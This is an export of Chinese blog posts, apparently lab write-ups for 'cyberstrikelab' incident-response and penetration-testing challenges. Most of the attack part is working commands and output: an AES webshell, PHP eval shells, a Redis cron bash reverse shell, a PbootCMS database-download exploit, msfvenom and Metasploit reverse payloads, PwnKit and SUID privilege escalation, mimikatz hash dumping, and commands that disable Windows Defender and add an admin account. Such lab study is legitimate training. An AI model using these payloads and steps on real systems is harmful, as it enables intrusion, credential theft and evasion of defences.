[{"title":"cyberstrikelab CERT-1","path":"/2025/07/25/CERT-1/","content":"CERT-1 靶机ip: 10.1.1.6 攻击机ip: 172.16.233.2 一个阳光明媚的下午，小王正悠闲的吃着甲方提供的零食，突然在监控设备上发现某机器沦陷的告警，这可给小王吓出一身冷汗，于是急忙找甲方的IT人员要到这台机器的账号密码为administrator CERT@cslab，火速开启应急之旅。。。 1.攻击者通过什么漏洞进行渗透的？(base) Downloads fscan -h 10.1.1.6 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan10.1.1.6:80 open10.1.1.6:139 open10.1.1.6:135 open10.1.1.6:445 open10.1.1.6:8009 open[*] alive ports len is: 5start vulscan[*] WebTitle http://10.1.1.6 code:200 len:11432 title:Apache Tomcat/8.5.19[*] NetInfo[*]10.1.1.6 [-]WIN-5ICRQ1SU4GE [-]10.1.1.6[+] PocScan http://10.1.1.6 poc-yaml-tomcat-cve-2017-12615-rce CVE-2017-12615 2.攻击者的webshell名称叫什么？ 打开查看最近使用文件打开文件所在目录，在 C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5\\logs 找到localhost_access_log.2025-03-19.txt PUT上传后一直使用 Tomcat9.jsp 3.webshell的密码是什么？tomcat9.jsp为 %@page import=java.util.*,javax.crypto.*,javax.crypto.spec.*%%!class U extends ClassLoaderU(ClassLoader c)super(c);public Class g(byte []b)return super.defineClass(b,0,b.length);%%if (request.getMethod().equals(POST))String k=e99d8eaf2c6b8b02;session.putValue(u,k);Cipher c=Cipher.getInstance(AES);c.init(2,new SecretKeySpec(k.getBytes(),AES));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);% import hashlibdef find_password_from_key(aes_key, dict_path=dict.txt): 根据冰蝎马的 AES 密钥（为连接密码 md5 的前16位）、 aes_key = aes_key.lower() with open(dict_path, r, encoding=utf-8) as f: for line in f: password = line.strip() if not password: continue md5 = hashlib.md5(password.encode()).hexdigest() if md5[:16] == aes_key: print(f[+] 找到连接密码: password) return password else: print(f[*] 尝试密码: password) print([-] 没找到匹配的密码) return Noneif __name__ == __main__: # 从服务端代码里拿到的 key aes_key = e99d8eaf2c # 字典文件（可改成 rockyou.txt ） dict_file = dict.txt find_password_from_key(aes_key, dict_file) cslab 4.攻击者留下的后门软件的名称是什么？Windows defender发现了，在C:\\ProgramData\\Oracle\\Java\\installcache_x64\\wyutdsgvxczbvc1.exe wyutdsgvxczbvc1.exe 5.攻击者反弹shell的ip是多少？逆向看字符串没找到，用日志的攻击IP就成功了 192.168.101.10","tags":["应急响应"]},{"title":"cyberstrikelab CERT-2","path":"/2025/07/25/CERT-2/","content":"CERT-2 靶机ip: 10.10.10.8 攻击机ip: 172.16.233.2 1.攻击者通过哪个应用进入系统的？(base) Downloads fscan -h 10.10.10.8 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan10.10.10.8:80 open10.10.10.8:445 open10.10.10.8:135 open10.10.10.8:139 open10.10.10.8:3306 open[*] alive ports len is: 5start vulscan[*] WebTitle http://10.10.10.8 code:200 len:11160 title:帝国网站管理系统 - Powered by EmpireCMS[*] NetInfo[*]10.10.10.8 [-]WIN-BOTKV21N2IS [-]10.10.10.8[+] InfoScan http://10.10.10.8 [CMS] mysql也没有弱口令,empirecms是错的，目录扫描有phpmyadmin，直接rootroot就能登录，应该就是phpmyadmin进来的 phpmyadmin 2.攻击者写入的webshell密码是什么？看名字都能看shell gfdnvbhgfh 3.攻击者添加的用户名是什么？传D盾管理员运行 cslab$ 4.攻击者在webshell中执行的系统命令是什么？ systeminfo 5.攻击者留下的计划任务名称？打开任务计划程序查看,但是太多了，在windows defender直接可以看到 C:\\Users\\Administratorschtasks /query /fo LIST /v 1.txt","tags":["应急响应"]},{"title":"cyberstrikelab CERT-3","path":"/2025/07/25/CERT-3/","content":"CERT-31.黑客使用的攻击手段CVE编号是？222.rar解压发现，但是有个文件没能成功解压 @echo offcertutil -urlcache -split -f http://CERT.cslab/befsavc.exe c:\\\\ADFS\\\\ar\\\\wjifasvcxgf.exe CVE-2023-38831 2.黑客执行exe文件的md5是？根据保存的后门文件wjifasvcxgf.exe aa0ac7706b25d60d61bd3cd922919979 3.黑客存放payload的域名是？根据bat文件可知 CERT.cslab 4.黑客反弹shell的ip是？放沙箱我没看到IP，但是看WP别人看到了 172.16.233.2 5.攻击者进行权限维持的exe名称是？ 打开windows defender开启查杀 simple.exe","tags":["应急响应"]},{"title":"cyberstrikelab database-2","path":"/2025/07/25/database-2/","content":"database-2 靶机ip: 10.0.0.10 攻击机ip: 172.16.233.2 信息收集(base) Downloads fscan2 -h 10.0.0.10 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[538ms] 已选择服务扫描模式[538ms] 开始信息扫描[539ms] 最终有效主机数量: 1[539ms] 开始主机扫描[539ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[542ms] 有效端口数量: 65535[637ms] [*] 端口开放 10.0.0.10:135[647ms] [*] 端口开放 10.0.0.10:139[821ms] [*] 端口开放 10.0.0.10:445[2.1s] [*] 端口开放 10.0.0.10:3306[2.1s] [*] 端口开放 10.0.0.10:3389[3.3s] [*] 端口开放 10.0.0.10:5985[21.9s] [*] 端口开放 10.0.0.10:47001[23.1s] [*] 端口开放 10.0.0.10:49666[23.1s] [*] 端口开放 10.0.0.10:49665[23.1s] [*] 端口开放 10.0.0.10:49664[23.1s] [*] 端口开放 10.0.0.10:49670[23.1s] [*] 端口开放 10.0.0.10:49667[23.1s] [*] 端口开放 10.0.0.10:49669[23.1s] [*] 端口开放 10.0.0.10:49668[31.3s] 扫描完成, 发现 14 个开放端口[31.3s] 存活端口数量: 14[31.3s] 开始漏洞扫描[31.5s] [*] NetInfo 扫描结果目标主机: 10.0.0.10主机名: WIN-J2B9EIUKEN3发现的网络接口: IPv4地址: └─ 10.0.0.10 mysql弱口令 UDF提权MDUT上线，直接UDF提权成功 certutil -urlcache -split -f http://172.16.233.2:8889/fenli.exe fenli.execertutil -urlcache -split -f http://172.16.233.2:8889/360.ini 360.inifenli.exe 360.ini juicypotato提权","tags":["juicypotato提权","mysql弱口令","udf提权"]},{"title":"cyberstrikelab database-5","path":"/2025/07/25/database-5/","content":"database-5 靶机ip: 192.168. 攻击机ip: 172.16.233.2 信息收集(base) Downloads fscan2 -h 10.0.0.20┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[528ms] 已选择服务扫描模式[528ms] 开始信息扫描[528ms] 最终有效主机数量: 1[528ms] 开始主机扫描[528ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[528ms] 有效端口数量: 233[623ms] [*] 端口开放 10.0.0.20:22[629ms] [*] 端口开放 10.0.0.20:6379[2.6s] 扫描完成, 发现 2 个开放端口[2.6s] 存活端口数量: 2[2.6s] 开始漏洞扫描[11.0s] [+] Redis认证成功 10.0.0.20:6379 [abc123] 文件位置:/var/www/redis/dump.rdb[11.4s] [+] Redis认证成功 10.0.0.20:6379 [abc123] 文件位置:/var/www/redis/dump.rdb[11.9s] [+] Redis认证成功 10.0.0.20:6379 [abc123] 文件位置:/var/www/redis/dump.rdb redis定时任务(base) Downloads redis-cli -h 10.0.0.20 -a abc123Warning: Using a password with -a or -u option on the command line interface may not be safe.10.0.0.20:6379 config set dir /var/spool/cron/OK10.0.0.20:6379 config set dbfilename rootOK10.0.0.20:6379 set shell */1 * * * * /bin/bash -i/dev/tcp/172.16.233.2/1234 01 OK10.0.0.20:6379 saveOK (base) Downloads pwncat-cs -lp 1234/opt/homebrew/lib/python3.10/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release class: algorithms.Blowfish,[16:33:12] Welcome to pwncat 🐈! __main__.py:164[16:35:02] received connection from 10.0.0.20:57962 bind.py:84[16:35:02] 0.0.0.0:1234: normalizing shell path manager.py:957[16:35:03] 10.0.0.20:57962: registered new host w/ db manager.py:957(local) pwncat$ back(remote) root@localhost.localdomain:/root# cat /root/flag.txtgo-flag2a67f04e-71b8-494f-555f-bb5d3732c789","tags":["redis"]},{"title":"cyberstrikelab database-3","path":"/2025/07/25/database-3/","content":"database-3 靶机ip: 10.0.0.14 攻击机ip: 172.16.233.2 信息收集(base) Downloads fscan2 -h 10.0.0.14┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[532ms] 已选择服务扫描模式[532ms] 开始信息扫描[532ms] 最终有效主机数量: 1[532ms] 开始主机扫描[532ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[532ms] 有效端口数量: 233[587ms] [*] 端口开放 10.0.0.14:135[590ms] [*] 端口开放 10.0.0.14:139[590ms] [*] 端口开放 10.0.0.14:445[656ms] [*] 端口开放 10.0.0.14:1433[1.7s] 扫描完成, 发现 4 个开放端口[1.7s] 存活端口数量: 4[1.7s] 开始漏洞扫描[1.8s] [*] NetInfo 扫描结果目标主机: 10.0.0.14主机名: WIN-P2EUDKIN1IG发现的网络接口: IPv4地址: └─ 10.0.0.14[23.8s] 扫描已完成: 7/7 mssql弱口令 不用提权直接读取txt","tags":["MSSQL"]},{"title":"cyberstrikelab EVA-1","path":"/2025/07/24/EVA-1/","content":"EVA-1 靶机ip: 10.0.0.95 攻击机ip: 172.16.233.2 进来直接上传文件了 asp马也会杀，用webshell-generate生成免杀马，分离免杀上线，使用juidypotato提权到system","tags":["分离免杀"]},{"title":"cyberstrikelab EVA-2","path":"/2025/07/24/EVA-2/","content":"EVA-2 靶机ip: 192.168. 攻击机ip: 172.16.233.2 信息收集目录扫描发现Upload.aspx 像上题一样分离免杀和webshell免杀上线，直接juicypotato提权,但是有卡巴斯基，还关不了，直接导出来看了 reg save HKLM\\SYSTEM C:/inetpub/wwwroot/upload/system.hivreg save HKLM\\SAM C:/inetpub/wwwroot/upload/sam.hivreg save HKLM\\security C:/inetpub/wwwroot/upload/security.hiv mimikatz.exe log hash.txt lsadump::sam /system:system.hiv /sam:sam.hiv /security security.hiv exit","tags":["分离免杀"]},{"title":"cyberstrikelab PRIV-6","path":"/2025/07/24/PRIV-6/","content":"PRIV-6 靶机ip: 192.168. 攻击机ip: 172.16.233.2 信息收集(base) ➜ Downloads wpscan --url http://192.168.111.199 --api-token $WPSCAN_API_TOKEN -e u,vp --plugins-detection aggressive_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | _ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.28 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://192.168.111.199/ [192.168.111.199][+] Started: Thu Jul 24 15:42:53 2025Interesting Finding(s):[+] Headers | Interesting Entries: | - Server: Apache/2.4.6 (CentOS) PHP/7.4.33 | - X-Powered-By: PHP/7.4.33 | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://192.168.111.199/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://192.168.111.199/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://192.168.111.199/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://192.168.111.199/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 6.7 identified (Insecure, released on 2024-11-12). | Found By: Rss Generator (Passive Detection) | - http://192.168.111.199/index.php/feed/, generatorhttps://wordpress.org/?v=6.7/generator | - http://192.168.111.199/index.php/comments/feed/, generatorhttps://wordpress.org/?v=6.7/generator[+] WordPress theme in use: twentytwentyfive | Location: http://192.168.111.199/wp-content/themes/twentytwentyfive/ | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://192.168.111.199/wp-content/themes/twentytwentyfive/readme.txt | [!] The version is out of date, the latest version is 1.2 | [!] Directory listing is enabled | Style URL: http://192.168.111.199/wp-content/themes/twentytwentyfive/style.css?ver=1.0 | Style Name: Twenty Twenty-Five | Style URI: https://wordpress.org/themes/twentytwentyfive/ | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.111.199/wp-content/themes/twentytwentyfive/style.css?ver=1.0, Match: Version: 1.0[+] Enumerating Vulnerable Plugins (via Aggressive Methods) Checking Known Locations - Time: 00:01:17 ============================================================= (7343 / 7343) 100.00% Time: 00:01:17[+] Checking Plugin Versions (via Passive and Aggressive Methods)[i] Plugin(s) Identified:[+] wp-autosuggest | Location: http://192.168.111.199/wp-content/plugins/wp-autosuggest/ | Latest Version: 0.24 (up to date) | Last Updated: 2009-06-13T06:56:00.000Z | Readme: http://192.168.111.199/wp-content/plugins/wp-autosuggest/readme.txt | [!] Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | - http://192.168.111.199/wp-content/plugins/wp-autosuggest/, status: 200 | | [!] 1 vulnerability identified: | | [!] Title: WP AutoSuggest 0.24 - Unauthenticated SQL Injection | References: | - https://wpscan.com/vulnerability/01d2cea9-46ba-4d89-9fe9-056917f7a7f8 | - https://www.exploit-db.com/exploits/45977/ | | Version: 0.24 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://192.168.111.199/wp-content/plugins/wp-autosuggest/readme.txt[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:03 ================================================================= (10 / 10) 100.00% Time: 00:00:03[i] User(s) Identified:[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://192.168.111.199/index.php/wp-json/wp/v2/users/?per_page=100page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection)[+] WPScan DB API OK | Plan: free | Requests Done (during the scan): 4 | Requests Remaining: 21[+] Finished: Thu Jul 24 15:44:27 2025[+] Requests Done: 7409[+] Cached Requests: 8[+] Data Sent: 2.017 MB[+] Data Received: 1.319 MB[+] Memory used: 246.223 MB[+] Elapsed time: 00:01:34 虽然有漏洞能sql注入 sqlmap -u http://URL/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=querywpas_keys=1 --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --sql-shell 但是我直接admin/admin弱口令进来了 然后启用插件后访问 http://192.168.111.199/wp-content/plugins/hello.php 在家目录发现了个pass.txt 拿个交互shell bash -c bash -i /dev/tcp/172.16.233.2/1234 01 使用suForce (remote) www-data@localhost.localdomain:/home/www-data$ ./suForce -u root -w pass.txt _____ ___ _ _ | ___|__ _ __ ___ ___/ __| | | || |_ / _ \\| __/ __/ _ \\\\__ \\ |_| || _| (_) | | | (_| __/|___/\\__,_||_| \\___/|_| \\___\\___|─────────────────────────────────── code: d4t4s3c version: v1.0.0───────────────────────────────────🎯 Username | root📖 Wordlist | pass.txt🔎 Status | 256/285/89%/csl@123yes💥 Password | csl@123yes─────────────────────────────────── 发现root密码为csl@123yes","tags":["wordpress"]},{"title":"cyberstrikelab PRIV-5","path":"/2025/07/24/PRIV-5/","content":"PRIV-5 靶机ip: 192.168. 攻击机ip: 172.16.233.2 信息收集PbootcmsPbootcms，进入后台http://192.168.111.186/admin.php #!/usr/bin/env python3#-*- coding: utf-8 -*-#author: myh0st@xazlsecimport requestsimport urllib3import sqlite3import sysimport timeimport jsonimport reurllib3.disable_warnings()def get_user_pass(): connection = sqlite3.connect(pbootcms.db) cursor = connection.cursor() try: cursor.execute(select name from sqlite_master where type=table;) result = cursor.fetchall() usertable = result[0][0] #print(result) for tablename in result: if re.search(user$, tablename[0]): usertable = tablename[0] break #print(usertable) cursor.execute(select * from +usertable+;) return cursor.fetchall() except: print(Oops! Something wrong, sys.exc_info(), sql) return []def verify(site): burp0_url = site + /data/pbootcms.db burp0_headers = User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0, Accept-Encoding: gzip r = requests.get(burp0_url, headers=burp0_headers, verify=False, timeout=20) if r.status_code == 200 and SQLite in r.text: with open(pbootcms.db, wb) as code: code.write(r.content) return get_user_pass() return if __name__==__main__: target = sys.argv[1] info = verify(target) if info != : print([+]漏洞存在，读取到的管理员账号信息为：, info) else: print([-]漏洞不存在) sql注入获取用户名密码 (base) pbootcms python3 pbootcms-database-download.py http://192.168.111.186/Found existing alias for python3. You should use: p[+]漏洞存在，读取到的管理员账号信息为： [(1, 10001, admin, 超级管理员, 95db17ffe58888e31be38df95709f144, 1, 6, 3232266872, admin, admin, 2017-05-08 18:50:30, 2025-01-13 13:38:55)] admin/cyberstrikelab登录成功，本机执行 (base) Downloads echo ?php @eval($_POST[1]); ? 1.txt(base) Downloads p -m http.server 8889Serving HTTP on :: port 8889 (http://[::]:8889/) ... ?php$test=copy;$test(http://172.16.233.2:8889/1.txt,test.php);? 然后随便点击任意文章，触发漏洞 因为是linux系统，我直接反弹shell了 bash -i /dev/tcp/172.16.233.2/1234 01 无语的是www-data还有home目录，flag在那，给我找半天 find提权(remote) www-data@localhost.localdomain:/var/www/html$ find / -perm -4000 2/dev/null/usr/bin/find/usr/bin/fusermount/usr/bin/passwd/usr/bin/mount/usr/bin/chage/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/su/usr/bin/staprun/usr/bin/umount/usr/bin/chfn/usr/bin/chsh/usr/bin/pkexec/usr/bin/crontab/usr/bin/at/usr/bin/sudo/usr/sbin/pam_timestamp_check/usr/sbin/unix_chkpwd/usr/sbin/usernetctl/usr/sbin/userhelper/usr/lib/polkit-1/polkit-agent-helper-1/usr/libexec/dbus-1/dbus-daemon-launch-helper/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache (remote) www-data@localhost.localdomain:/var/www/html$ /usr/bin/find . -exec /bin/sh -p \\; -quit(remote) root@localhost.localdomain:/var/www/html#","tags":["find提权","Pbootcms"]},{"title":"cyberstrikelab PRIV-7","path":"/2025/07/24/PRIV-7/","content":"PRIV-7极致CMS进入页面发现注册登录，没发现弱口令，注册登录上去后能直接在头像处传webshell，并且直接是png 第一个flag在/home/apache/flag1.txt linux提权sudo -lfind / -user root -perm -4000 2/dev/null 都没找到提权的命令，尝试使用msf辅助提权，先生成shell sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.233.2 LPORT=7777 -f elf cc msfconsole use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 172.16.233.2set lport 7777msf6 exploit(multi/handler) run[*] Started reverse TCP handler on 172.16.233.2:7777[*] Sending stage (3045380 bytes) to 192.168.111.200[*] Meterpreter session 2 opened (172.16.233.2:7777 - 192.168.111.200:34258) at 2025-03-18 21:52:40 +0800 利用自带的功能扫描提权利用点 run post/multi/recon/local_exploit_suggester 找到后一个个试 run exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec lhost=172.16.233.2 lport=7777 bg","tags":["极致CMS","linux提权"]},{"title":"cyberstrikelab PRIV-8","path":"/2025/07/24/PRIV-8/","content":"PRIV-8pluck点击admin进入登录页面 密码123456登录成功，参考 https://xz.aliyun.com/news/6147?time__1311=YqIxBDyGiti%3DG%3DD%2FD0ex2GDnQu9bz0SEgbDu_atoken=171714b8f56f7574de348e800080e11bu_asig=1a0c399d17404123434468916e0039 访问http://192.168.111.203/admin.php?action=images 制作图片马 (base) pluck cat 1.php?php @eval($_POST[1]);phpinfo();?(base) pluck cat normal.jpg 1.php cc.jpg suid没找到能提权的，弹到msf尝试内核漏洞提权 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.16.233.2 LPORT=8989 -f elf shell msf6 use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) set payload linux/x64/meterpreter/reverse_tcppayload = linux/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) set lhost 172.16.233.2lhost = 172.16.233.2msf6 exploit(multi/handler) set lport 8989lport = 8989msf6 exploit(multi/handler) run[*] Started reverse TCP handler on 172.16.233.2:8989[*] Sending stage (1017704 bytes) to 192.168.111.203[*] Meterpreter session 1 opened (172.16.233.2:8989 - 192.168.111.203:42210) at 2025-07-24 18:03:03 +0800meterpreter 运行自带的提权模块 meterpreter run exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec lhost=172.16.233.2 lport=6667[*] Started reverse TCP handler on 172.16.233.2:6667[*] Running automatic check (set AutoCheck false to disable)[!] Verify cleanup of /tmp/.uersninvlr[+] The target is vulnerable.[*] Writing /tmp/.rqhrfqjdxela/hkbsecthgw/hkbsecthgw.so (540 bytes) ...[!] Verify cleanup of /tmp/.rqhrfqjdxela[*] Sending stage (3045380 bytes) to 192.168.111.203[+] Deleted /tmp/.rqhrfqjdxela/hkbsecthgw/hkbsecthgw.so[+] Deleted /tmp/.rqhrfqjdxela/.hxdvnyldsfwu[+] Deleted /tmp/.rqhrfqjdxela[*] Meterpreter session 6 opened (172.16.233.2:6667 - 192.168.111.203:34084) at 2025-07-24 18:09:28 +0800[*] Session 6 created in the background. msf6 exploit(multi/handler) sessions -i 6[*] Starting interaction with 6...meterpreter shellProcess 7267 created.Channel 1 created.whoamirootcd /rootlsanaconda-ks.cfgflag2.txtcat flag2.txtgo-flag9019249D-749F-3C7B-9BA2-C656B5E69A72","tags":["pluck"]},{"title":"cyberstrikelab PRIV-2","path":"/2025/07/23/PRIV-2/","content":"PRIV-2 靶机ip: 10.0.0.1 攻击机ip: 172.16.233.2 信息收集(base) Downloads fscan2 -h 10.0.0.1 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[554ms] 已选择服务扫描模式[554ms] 开始信息扫描[554ms] 最终有效主机数量: 1[554ms] 开始主机扫描[554ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[557ms] 有效端口数量: 65535[803ms] [*] 端口开放 10.0.0.1:445[814ms] [*] 端口开放 10.0.0.1:135[820ms] [*] 端口开放 10.0.0.1:139[2.1s] [*] 端口开放 10.0.0.1:3306[4.2s] [*] 端口开放 10.0.0.1:8088[23.6s] [*] 端口开放 10.0.0.1:49152[23.6s] [*] 端口开放 10.0.0.1:49154[23.6s] [*] 端口开放 10.0.0.1:49155[23.6s] [*] 端口开放 10.0.0.1:49153[23.6s] [*] 端口开放 10.0.0.1:49157[23.6s] [*] 端口开放 10.0.0.1:49156[31.3s] 扫描完成, 发现 11 个开放端口[31.3s] 存活端口数量: 11[31.3s] 开始漏洞扫描[31.3s] POC加载完成: 总共387个，成功387个，失败0个[31.4s] [*] NetInfo 扫描结果目标主机: 10.0.0.1主机名: WIN-IUK9F0LSNWD发现的网络接口: IPv4地址: └─ 10.0.0.1[31.5s] [+] 发现漏洞 10.0.0.1 [Windows Server (R) 2008 Datacenter 6001 Service Pack 1] MS17-010[31.5s] [+] NetBios 10.0.0.1 WORKGROUP\\WIN-IUK9F0LSNWD Windows Server (R) 2008 Datacenter 6001 Service Pack 1[31.5s] [+] MySQL 10.0.0.1:3306 root 123456[31.6s] [*] 网站标题 http://10.0.0.1:8088 状态码:403 长度:209 标题:403 Forbidden[37.4s] 扫描已完成: 9/9 mysql弱口令，题目直接提示了udf提权 命令行连接会报错，估计是代理问题，我这里用dbeaver (base) Downloads mysql -h 10.0.0.1 -u root -P 3306ERROR 1045 (28000): Access denied for user root@192.168.122.36 (using password: NO) secure_file_priv有值，无法udf提权,然后找找web目录信息 (base) CVE-2020-0796-RCE-POC [master] dirsearch -u http://10.0.0.1:8088//Users/gongtaiyun/Desktop/secs/tools/info/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722Output: /Users/gongtaiyun/Desktop/secs/tools/info/dirsearch/reports/http_10.0.0.1_8088/__25-07-24_09-52-58.txtTarget: http://10.0.0.1:8088/[09:52:58] Starting:[09:53:12] 403 - 220B - /.ht_wsr.txt[09:53:12] 403 - 223B - /.htaccess.bak1[09:53:12] 403 - 223B - /.htaccess.orig[09:53:12] 403 - 225B - /.htaccess.sample[09:53:12] 403 - 223B - /.htaccess.save[09:53:12] 403 - 224B - /.htaccess_extra[09:53:12] 403 - 223B - /.htaccess_orig[09:53:12] 403 - 221B - /.htaccess_sc[09:53:12] 403 - 221B - /.htaccessOLD[09:53:12] 403 - 222B - /.htaccessOLD2[09:53:12] 403 - 221B - /.htaccessBAK[09:53:12] 403 - 219B - /.htpasswds[09:53:12] 403 - 220B - /.httr-oauth[09:53:12] 403 - 223B - /.htpasswd_test[09:53:27] 200 - 0B - /1.php[09:55:05] 403 - 225B - /index.php::$DATA[09:56:19] 403 - 225B - /Trace.axd::$DATA[09:56:30] 403 - 226B - /web.config::$DATATask Completed 发现有1.php还是空的，大概率是个后门，arjun找参数get post都没找到，最后猜了个cslab对了 juicypotato提权cs自带的都提不上去，最后使用https://github.com/uknowsec/JuicyPotato/tree/main/JuicyPotato-webshell/Bin提成功","tags":["juicypotato提权"]},{"title":"cyberstrikelab PRIV-3","path":"/2025/07/23/PRIV-3/","content":"PRIV-3MSSQL 你从张三的口中社工到一个账号为sa，密码为sa@cslab的账号 Mssql 使用MDUT的XpCmdShell提权发现是network service权限 发现有windows defender 但是CLR直接能获得system权限 但是拒绝访问了 takeown /F C:\\flag.txt /Aicacls C:\\flag.txt /grant SYSTEM:F 也还是拒绝访问了 关闭windows defender reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableRealtimeMonitoring /d 1 /t REG_DWORD /fREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fnet user cc Admin@123 /addnet localgroup Administrators cc /addnetsh firewall set opmode disable 远程桌面也访问不了，直接CS看看 用badpotato提权才行","tags":["MSSQL"]},{"title":"cyberstrikelab PRIV-1","path":"/2025/07/23/PRIV-1/","content":"PRIV-1siteserver 